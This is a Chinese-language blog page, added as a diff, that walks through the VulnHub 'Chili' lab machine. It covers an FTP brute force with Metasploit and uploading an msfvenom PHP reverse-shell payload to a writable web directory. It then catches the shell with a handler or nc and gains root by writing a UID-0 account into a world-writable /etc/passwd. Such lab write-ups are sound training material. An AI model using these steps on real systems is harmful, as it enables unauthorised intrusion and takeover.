@@ -1,0 +1,750 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+        
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>vulnhub |  小张之栈</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/favicon.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      <canvas class="fireworks"></canvas>
+      <style>
+        .fireworks {
+          position: fixed;
+          left: 0;
+          top: 0;
+          z-index: 99999;
+          pointer-events: none;
+        }
+      </style>
+      
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-vulnhub"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+  
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  vulnhub
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2023/06/30/vulnhub/" class="article-date">
+  <time datetime="2023-06-29T16:21:20.000Z" itemprop="datePublished">2023-06-30</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a> / <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/vulnhub/">vulnhub</a> / <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/vulnhub/%E9%9D%B6%E5%9C%BA/">靶场</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">3.2k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">17 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="一、easy"><a href="#一、easy" class="headerlink" title="一、easy"></a>一、easy</h1><h2 id="1-chili-ftp-监听"><a href="#1-chili-ftp-监听" class="headerlink" title="1.chili(ftp+监听)"></a>1.chili(ftp+监听)</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><p><code>netdiscover</code></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620204515392.png"></p>
+<p>ip为192.168.1.4</p>
+<h3 id="2-扫描端口"><a href="#2-扫描端口" class="headerlink" title="2.扫描端口"></a>2.扫描端口</h3><p><code>nmap -Pn 192.168.1.4</code></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620204816839.png"></p>
+<p>21端口和80端口</p>
+<p>再详细点</p>
+<p><code>nmap -p21,80 -Pn -sV -sS -A -n 192.168.1.4</code>                                           </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nmap -p21,80 -Pn -sV -sS -A -n 192.168.1.4</span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-20 20:50 CST</span><br><span class="line">Nmap scan report for 192.168.1.4</span><br><span class="line">Host is up (0.00073s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Chili</span><br><span class="line">MAC Address: 00:0C:29:FE:75:B5 (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.6</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Unix</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.73 ms 192.168.1.4</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-访问80端口"><a href="#3-访问80端口" class="headerlink" title="3.访问80端口"></a>3.访问80端口</h3><p>一个小辣椒图片。</p>
+<p>f12，网页源代码，发现有一些单词提示</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620210231238.png"></p>
+<p>cewl工具爬取</p>
+<blockquote>
+<p>┌──(root㉿kali)-[~]</p>
+<p>└─# cewl <a target="_blank" rel="noopener" href="http://192.168.1.4/">http://192.168.1.4</a> &gt;user.txt</p>
+<p>┌──(root㉿kali)-[~]<br>└─# cat user.txt<br>Chili<br>Are<br>Still<br>Alive</p>
+</blockquote>
+<p>当然还要将该文件的单词，大写复写，小写复写一遍。</p>
+<p>打开msf工具准备ftp弱口令爆破。</p>
+<blockquote>
+<p>-<strong>msfconsole</strong></p>
+<p>-show auxiliary</p>
+<p>-search ftp_login</p>
+<p>-use 0</p>
+<p>-show options</p>
+<p>…</p>
+</blockquote>
+<blockquote>
+<p>-set rhosts 192.168.1.4</p>
+<p>-set user_file user.txt</p>
+<p>-set pass_file password.txt</p>
+</blockquote>
+<blockquote>
+<p>-exploit</p>
+</blockquote>
+<p>当然，我没爆破出来，字典不行。</p>
+<p>看wp得，密码为a1b2c3d4</p>
+<h3 id="4-ftp连接"><a href="#4-ftp连接" class="headerlink" title="4.ftp连接"></a>4.ftp连接</h3><blockquote>
+<p>└─# ftp 192.168.1.4<br>Connected to 192.168.1.4.<br>220 (vsFTPd 3.0.3)<br>Name (192.168.1.4:root): chili<br>331 Please specify the password.<br>Password:<br>230 Login successful.<br>Remote system type is UNIX.<br>Using binary mode to transfer files.</p>
+</blockquote>
+<blockquote>
+<p>ftp&gt;pwd</p>
+<p>…</p>
+<p>经过一系列尝试，访问进网站根目录。</p>
+<p>ftp&gt; cd var&#x2F;www&#x2F;html<br>250 Directory successfully changed.<br>ftp&gt; ls -la<br>229 Entering Extended Passive Mode (|||5328|)<br>150 Here comes the directory listing.<br>drwxr-xr-x    4 0        0            4096 Sep 08  2020 .<br>drwxr-xr-x    3 0        0            4096 Sep 08  2020 ..<br>drwxrwxrwx    2 0        0            4096 Sep 08  2020 .nano<br>drwxr-xr-x    2 0        0            4096 Sep 08  2020 .vim<br>-rw-r–r–    1 0        0           74290 Oct 23  2018 Chile_WEB.jpg<br>-rw-r–r–    1 0        0             657 Sep 08  2020 index.html</p>
+</blockquote>
+<p>根据常识</p>
+<blockquote>
+<ul>
+<li><code>d</code> 表示文件夹（目录）</li>
+<li><code>r</code> 表示具有读取权限</li>
+<li><code>w</code> 表示具有写入权限</li>
+<li><code>x</code> 表示具有执行权限</li>
+<li><code>-</code> 表示没有相应的权限</li>
+</ul>
+</blockquote>
+<p> <strong>.nano是一个文件夹，且用户对该目录有读写权限</strong></p>
+<p>考虑上传木马</p>
+<h3 id="5-上传木马"><a href="#5-上传木马" class="headerlink" title="5.上传木马"></a>5.上传木马</h3><blockquote>
+<p>└─# msfvenom -p php&#x2F;meterpreter_reverse_tcp LHOST&#x3D;<strong>kali的ip</strong> LPORT&#x3D;4444 -f raw  &gt; shell.php<br>[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload<br>[-] No arch selected, selecting arch: php from the payload<br>No encoder specified, outputting raw payload<br>Payload size: 34852 bytes</p>
+</blockquote>
+<blockquote>
+<p>ftp&gt; cd .nano   &#x2F;&#x2F;切换进文件夹<br>250 Directory successfully changed.<br>ftp&gt; ls -la<br>229 Entering Extended Passive Mode (|||36678|)<br>150 Here comes the directory listing.<br>drwxrwxrwx    2 0        0            4096 Sep 08  2020 .<br>drwxr-xr-x    4 0        0            4096 Sep 08  2020 ..<br>-rw-r–r–    1 1000     1000            0 Sep 08  2020 index.html<br>226 Directory send OK.</p>
+</blockquote>
+<blockquote>
+<p>ftp&gt; put shell.php  &#x2F;&#x2F;放置木马<br>local: shell.php remote: shell.php<br>229 Entering Extended Passive Mode (|||14637|)<br>150 Ok to send data.<br>100% |********************************| 34852       15.08 MiB&#x2F;s    00:00 ETA<br>226 Transfer complete.<br>34852 bytes sent in 00:00 (5.13 MiB&#x2F;s)<br>ftp&gt; ls -la<br>229 Entering Extended Passive Mode (|||41969|)<br>150 Here comes the directory listing.<br>drwxrwxrwx    2 0        0            4096 Jun 20 09:58 .<br>drwxr-xr-x    4 0        0            4096 Sep 08  2020 ..<br>-rw-r–r–    1 1000     1000            0 Sep 08  2020 index.html<br>-rw——-    1 1000     1000        34852 Jun 20 09:58 shell.php  &#x2F;&#x2F;上传成功<br>226 Directory send OK.</p>
+</blockquote>
+<blockquote>
+<p>ftp&gt; chmod 777 shell.php   &#x2F;&#x2F;改权限<br>200 SITE CHMOD command ok.<br>ftp&gt; ls -la<br>229 Entering Extended Passive Mode (|||26075|)<br>150 Here comes the directory listing.<br>drwxrwxrwx    2 0        0            4096 Jun 20 09:58 .<br>drwxr-xr-x    4 0        0            4096 Sep 08  2020 ..<br>-rw-r–r–    1 1000     1000            0 Sep 08  2020 index.html<br>-rwxrwxrwx    1 1000     1000        34852 Jun 20 09:58 shell.php</p>
+</blockquote>
+<h3 id="6-msf反弹shell"><a href="#6-msf反弹shell" class="headerlink" title="6.msf反弹shell"></a>6.msf反弹shell</h3><p>监听端口。</p>
+<blockquote>
+<p>msf6 &gt; use exploit&#x2F;multi&#x2F;handler<br>[*] Using configured payload generic&#x2F;shell_reverse_tcp<br>msf6 exploit(multi&#x2F;handler) &gt; set patload php&#x2F;meterpreter_reverse_tcp<br>[-] Unknown datastore option: patload. Did you mean PAYLOAD?<br>msf6 exploit(multi&#x2F;handler) &gt; set payload php&#x2F;meterpreter_reverse_tcp<br>payload &#x3D;&gt; php&#x2F;meterpreter_reverse_tcp<br>msf6 exploit(multi&#x2F;handler) &gt; set lhost 192.168.1.4<br>lhost &#x3D;&gt; 192.168.1.4<br>msf6 exploit(multi&#x2F;handler) &gt; exploit</p>
+<p>[-] Handler failed to bind to 192.168.1.4:4444:-  -<br>[*] Started reverse TCP handler on 0.0.0.0:4444 </p>
+</blockquote>
+<p><code>use exploit/multi/handler</code>用于创建一个多功能的处理器，用于<strong>接收和处理</strong>来自<strong>漏洞利用的连接</strong>。</p>
+<p>使用 <code>use exploit/multi/handler</code> 命令后，可以设置一些参数，例如<strong>监听的IP地址、监听的端口、Payload（有效载荷）</strong>等。这样设置后，当成功利用一个漏洞并建立起连接时，多功能处理器将接收到连接并执行预定义的操作，例如获取 shell 或者执行其他命令。</p>
+<p>然后浏览器访问<a target="_blank" rel="noopener" href="http://192.168.1.4/.nano/shell.php">http://192.168.1.4/.nano/shell.php</a></p>
+<blockquote>
+<p>meterpreter &gt; getuid<br>Server username: www-data  监听到了。</p>
+</blockquote>
+<p>当然了 nc也行 <code>nc -lvnp 4444</code></p>
+<blockquote>
+<p>起一个 nc 监听，访问 <code>http://192.168.1.4/.nano/php-reverse-shell.php</code>，成功接收到反弹的 shell，并执行命令 <code>SHELL=/bin/bash script -q /dev/null</code> 获得一个交互式 shell</p>
+</blockquote>
+<p>我试了不行诶。</p>
+<p> 遇到反弹后不是正常的shell，可用命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>转化为常规的shell。</p>
+<h3 id="7-提权"><a href="#7-提权" class="headerlink" title="7.提权"></a>7.提权</h3><p>查找用户可读可写、可执行文件、SUID文件</p>
+<p>&#x2F;etc&#x2F;passwd可写，可以写入具有root权限的用户</p>
+<blockquote>
+<p>工具 enumy64：是一款linux后渗透提权枚举工具，是一个快速的可移植、可执行文件 <a target="_blank" rel="noopener" href="https://github.com/luke-goddard/enumy/releases">Releases · luke-goddard&#x2F;enumy (github.com)</a></p>
+</blockquote>
+<p>上传该工具</p>
+<blockquote>
+<p>ftp&gt; put enumy64<br>local: enumy64 remote: enumy64<br>229 Entering Extended Passive Mode (|||47003|)<br>150 Ok to send data.<br>100% |********************************|   986 KiB   28.25 MiB&#x2F;s    00:00 ETA<br>226 Transfer complete.<br>1010192 bytes sent in 00:00 (26.89 MiB&#x2F;s)<br>ftp&gt; chmod 777 enumy64    &#x2F;&#x2F;更改工具权限<br>200 SITE CHMOD command ok.<br>ftp&gt; ls -la<br>229 Entering Extended Passive Mode (|||28394|)<br>150 Here comes the directory listing.<br>drwxrwxrwx    2 0        0            4096 Jun 20 10:19 .<br>drwxr-xr-x    4 0        0            4096 Sep 08  2020 ..<br>-rwxrwxrwx    1 1000     1000      1010192 Jun 20 10:19 enumy64<br>-rw-r–r–    1 1000     1000            0 Sep 08  2020 index.html<br>-rwxrwxrwx    1 1000     1000        34852 Jun 20 09:58 shell.php<br>226 Directory send OK.</p>
+</blockquote>
+<p><strong>在监听窗口处执行脚本</strong></p>
+<blockquote>
+<h1 id="meterpreter-gt-ls-laListing-x2F-var-x2F-www-x2F-html-x2F-nano"><a href="#meterpreter-gt-ls-laListing-x2F-var-x2F-www-x2F-html-x2F-nano" class="headerlink" title="meterpreter &gt; ls -laListing: &#x2F;var&#x2F;www&#x2F;html&#x2F;.nano"></a>meterpreter &gt; ls -la<br>Listing: &#x2F;var&#x2F;www&#x2F;html&#x2F;.nano</h1><p>Mode              Size     Type  Last modified              Name</p>
+<hr>
+<p>100777&#x2F;rwxrwxrwx  1010192  fil   2023-06-20 22:19:53 +0800  enumy64<br>100644&#x2F;rw-r–r–  0        fil   2020-09-09 01:14:15 +0800  index.html<br>100777&#x2F;rwxrwxrwx  34852    fil   2023-06-20 21:58:11 +0800  shell.php</p>
+<p>meterpreter &gt; .&#x2F;enumy64<br>[-] Unknown command: .&#x2F;enumy64<br>meterpreter &gt; <strong>shell</strong><br>Process 1147 created.<br>Channel 0 created.<br><strong>pwd</strong><br>&#x2F;var&#x2F;www&#x2F;html&#x2F;.nano<br><strong>.&#x2F;enumy64</strong></p>
+</blockquote>
+<blockquote>
+<p>Current User Info    uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)<br>Version              Linux version 4.19.0-10-amd64 (debian-kernel @ lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.132-1 (2020-07-24)<br>hostname             chili<br>Umask                u&#x3D;rwx,g&#x3D;rx,o&#x3D;rx</p>
+<h2 id="Last-Login"><a href="#Last-Login" class="headerlink" title="Last Login"></a>Last Login</h2><p>Username         Port     From             Latest<br>root             tty1                      Tue Sep  8 13:11:53 -0400 2020<br>chili            tty1                      Tue Sep  8 13:12:50 -0400 2020</p>
+<h2 id="User-Accounts"><a href="#User-Accounts" class="headerlink" title="User Accounts"></a>User Accounts</h2><p>root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash<br>sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync<br>chili:x:1000:1000:chili,,,:&#x2F;home&#x2F;chili:&#x2F;bin&#x2F;bash</p>
+<h2 id="Who-Else-Is-Logged-On"><a href="#Who-Else-Is-Logged-On" class="headerlink" title="Who Else Is Logged On"></a>Who Else Is Logged On</h2><p> 10:22:42 up  1:42,  0 users,  load average: 0.00, 0.00, 0.00<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</p>
+<h2 id="Groups"><a href="#Groups" class="headerlink" title="Groups"></a>Groups</h2><p>uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)<br>uid&#x3D;1(daemon) gid&#x3D;1(daemon) groups&#x3D;1(daemon)<br>uid&#x3D;2(bin) gid&#x3D;2(bin) groups&#x3D;2(bin)<br>uid&#x3D;3(sys) gid&#x3D;3(sys) groups&#x3D;3(sys)<br>uid&#x3D;4(sync) gid&#x3D;65534(nogroup) groups&#x3D;65534(nogroup)<br>uid&#x3D;5(games) gid&#x3D;60(games) groups&#x3D;60(games)<br>uid&#x3D;6(man) gid&#x3D;12(man) groups&#x3D;12(man)<br>uid&#x3D;7(lp) gid&#x3D;7(lp) groups&#x3D;7(lp)<br>uid&#x3D;8(mail) gid&#x3D;8(mail) groups&#x3D;8(mail)<br>uid&#x3D;9(news) gid&#x3D;9(news) groups&#x3D;9(news)<br>uid&#x3D;10(uucp) gid&#x3D;10(uucp) groups&#x3D;10(uucp)<br>uid&#x3D;13(proxy) gid&#x3D;13(proxy) groups&#x3D;13(proxy)<br>uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)<br>uid&#x3D;34(backup) gid&#x3D;34(backup) groups&#x3D;34(backup)<br>uid&#x3D;38(list) gid&#x3D;38(list) groups&#x3D;38(list)<br>uid&#x3D;39(irc) gid&#x3D;39(irc) groups&#x3D;39(irc)<br>uid&#x3D;41(gnats) gid&#x3D;41(gnats) groups&#x3D;41(gnats)<br>uid&#x3D;65534(nobody) gid&#x3D;65534(nogroup) groups&#x3D;65534(nogroup)<br>uid&#x3D;100(_apt) gid&#x3D;65534(nogroup) groups&#x3D;65534(nogroup)<br>uid&#x3D;101(systemd-timesync) gid&#x3D;102(systemd-timesync) groups&#x3D;102(systemd-timesync)<br>uid&#x3D;102(systemd-network) gid&#x3D;103(systemd-network) groups&#x3D;103(systemd-network)<br>uid&#x3D;103(systemd-resolve) gid&#x3D;104(systemd-resolve) groups&#x3D;104(systemd-resolve)<br>uid&#x3D;1000(chili) gid&#x3D;1000(chili) groups&#x3D;1000(chili),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)<br>uid&#x3D;999(systemd-coredump) gid&#x3D;999(systemd-coredump) groups&#x3D;999(systemd-coredump)<br>uid&#x3D;104(messagebus) gid&#x3D;110(messagebus) groups&#x3D;110(messagebus)<br>uid&#x3D;105(sshd) gid&#x3D;65534(nogroup) groups&#x3D;65534(nogroup)<br>uid&#x3D;106(ftp) gid&#x3D;113(ftp) groups&#x3D;113(ftp)</p>
+<p>Severity: MEDIUM  Name: sysctl ptrace is configured insecurly                                           -rw-r–r– 1 root root 0 Jun 20 10:22 &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;yama&#x2F;ptrace_scope<br><strong>Severity: INFO    Name: Found an new root user with UID 0: root</strong>                                         <strong>-rw-r–rw- 1</strong> root root 1450 Sep  8  2020 &#x2F;etc&#x2F;passwd<br>Severity: INFO    Name: Found an new root user with GID 0: root                                         -rw-r–rw- 1 root root 1450 Sep  8  2020 &#x2F;etc&#x2F;passwd<br>Severity: INFO    Name: Found an new user that can be logged into: root                                 -rw-r–rw- 1 root root 1450 Sep  8  2020 &#x2F;etc&#x2F;passwd<br>Severity: INFO    Name: Found an new user that can be logged into: sync                                 -rw-r–rw- 1 root root 1450 Sep  8  2020 &#x2F;etc&#x2F;passwd<br>Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user<br>Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user<br>Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user<br>Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user<br>Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user<br>Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user<br>Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user<br>Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user<br>Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user<br>Severity: INFO    Name: Found an new user that can be logged into: chili                                -rw-r–rw- 1 root root 1450 Sep  8  2020 &#x2F;etc&#x2F;passwd<br>Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user<br>Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user<br>Severity: HIGH    Name: Low entropy file that could be a private key                                    -rw-r–r– 1 root root 20661 Feb 11  2019 &#x2F;usr&#x2F;share&#x2F;X11&#x2F;xkb&#x2F;symbols&#x2F;pk<br>Severity: INFO    Name: Config file could contain passwords                                             -rw-r–r– 1 root root 494 Feb 10  2019 &#x2F;usr&#x2F;share&#x2F;libc-bin&#x2F;nsswitch.conf<br>Severity: MEDIUM  Name: Executable capable of spawning reverse shells found                             -rwxr-xr-x 1 root root 1168776 Apr 18  2019 &#x2F;usr&#x2F;bin&#x2F;bash<br>Severity: MEDIUM  Name: Executable capable of spawning reverse shells found                             -rwxr-xr-x 1 root root 736776 Apr 20  2020 &#x2F;usr&#x2F;bin&#x2F;openssl<br>Severity: MEDIUM  Name: Executable capable of spawning reverse shells found                             -rwxr-xr-x 2 root root 3201864 Jul 21  2020 &#x2F;usr&#x2F;bin&#x2F;perl<br>Severity: HIGH    Name: CAP_NET_RAW capablities enabled on file                                         -rwxr-xr-x 1 root root 69368 Jan 13  2020 &#x2F;usr&#x2F;bin&#x2F;ping<br>Severity: MEDIUM  Name: Executable capable of spawning reverse shells found                             -rwxr-xr-x 1 root root 8156 Jul 21  2020 &#x2F;usr&#x2F;bin&#x2F;cpan<br>Severity: MEDIUM  Name: Abnormal GUID enabled executable found                                          -rwxr-sr-x 1 root crontab 43568 Oct 11  2019 &#x2F;usr&#x2F;bin&#x2F;crontab<br>Severity: MEDIUM  Name: Abnormal GUID enabled executable found                                          -rwxr-sr-x 1 root tty 14736 May  4  2018 &#x2F;usr&#x2F;bin&#x2F;bsd-write<br>Severity: MEDIUM  Name: Abnormal SUID enabled executable found                                          -rwsr-xr-x 1 root root 10232 Mar 28  2017 &#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device<br>Severity: INFO    Name: Config file could contain passwords                                             -rw-r–r– 1 root root 239 Sep 27  2017 &#x2F;usr&#x2F;lib&#x2F;tmpfiles.d&#x2F;passwd.conf<br>Severity: MEDIUM  Name: Found backup &#x2F;etc&#x2F;shadow file                                                   -rw-r—– 1 root shadow 965 Sep  8  2020 &#x2F;etc&#x2F;shadow-<br>Severity: INFO    Name: Found backup &#x2F;etc&#x2F;passwd file                                                   -rw-r–r– 1 root root 1437 Sep  8  2020 &#x2F;etc&#x2F;passwd-<br>Severity: INFO    Name: Config file could contain passwords                                             -rw-r–r– 1 root root 494 Feb 10  2019 &#x2F;etc&#x2F;nsswitch.conf<br>Severity: INFO    Name: Config file could contain passwords                                             -rw-r–r– 1 root root 5849 Sep  8  2020 &#x2F;etc&#x2F;vsftpd.conf<br>Severity: MEDIUM  Name: Other permissions are higher than Group permissions                             -rw-r–rw- 1 root root 1450 Sep  8  2020 &#x2F;etc&#x2F;passwd<br>Generating JSON<br>Json saved at location -&gt; enumy.json<br>Total files scanned -&gt; 25176</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620222925066.png"></p>
+<p>发现，对&#x2F;etc&#x2F;passwd有写的权限</p>
+<h4 id="添加一个高权限用户"><a href="#添加一个高权限用户" class="headerlink" title="添加一个高权限用户"></a>添加一个高权限用户</h4><p>使用perl编译密码</p>
+<blockquote>
+<p>┌──(root㉿kali)-[~]<br>└─# &#x2F;usr&#x2F;bin&#x2F;perl -le ‘print crypt(“test”,”test”)’<br>teH0wLIpW0gyQ</p>
+</blockquote>
+<p><strong>在监听端口的shell中</strong></p>
+<blockquote>
+<p>Terminate channel 0? [y&#x2F;N]  y<br>meterpreter &gt; shell<br>Process 1249 created.<br>Channel 1 created.<br><strong>echo “test:teH0wLIpW0gyQ:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash” &gt; &#x2F;etc&#x2F;passwd</strong><br>&#x2F;&#x2F;test:teH0wLIpW0gyQ:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash这种格式是遵循 <code>/etc/passwd</code> 文件的格式。每个字段用冒号（<code>:</code>）分隔，表示不同的用户属性。按顺序，这些字段包括用户名、密码（在此示例中使用了一个哈希值）、用户ID、组ID、用户描述、主目录和默认的登录Shell。</p>
+</blockquote>
+<blockquote>
+<p>Terminate channel 1? [y&#x2F;N]  y<br>meterpreter &gt; shell<br>Process 1251 created.<br>Channel 2 created.<br>su test<br>Password: test<br>ls &#x2F;root<br>proof.txt<br>cat &#x2F;root&#x2F;proof.txt<br>Sun_CSR.Chili.af6d45da1f1181347b9e2139f23c6a5b</p>
+</blockquote>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>主机发现-&gt;端口扫描-&gt;版本、系统信息</p>
+<p>网页f12的敏感数据，ftp的密码爆破</p>
+<p>msfvenom，是一个可以生成后门木马的框架，在目标机上执行，本地监听上线。</p>
+<p>enumy64是一个linux后渗透提权枚举工具，一个快速的可移植可执行文件</p>
+<p>写入&#x2F;etc&#x2F;passwd中的密码时需要将写入的密码首先进行perl编码</p>
+<p>[VulnHub靶场系列：Chili_chili靶场_快吃小蛋糕吧的博客-CSDN博客](<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40549070/article/details/108926099?ops_request_misc=%7B%22request_id%22:%22168726603016800213067085%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168726603016800213067085&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-1-108926099-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=vulnhub">https://blog.csdn.net/qq_40549070/article/details/108926099?ops_request_misc=%7B%22request%5Fid%22%3A%22168726603016800213067085%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=168726603016800213067085&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-1-108926099-null-null.142^v88^control_2,239^v2^insert_chatgpt&amp;utm_term=vulnhub</a> chili&amp;spm&#x3D;1018.2226.3001.4187)</p>
+<h2 id="2、tiki"><a href="#2、tiki" class="headerlink" title="2、tiki"></a>2、tiki</h2> 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/06/30/vulnhub/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
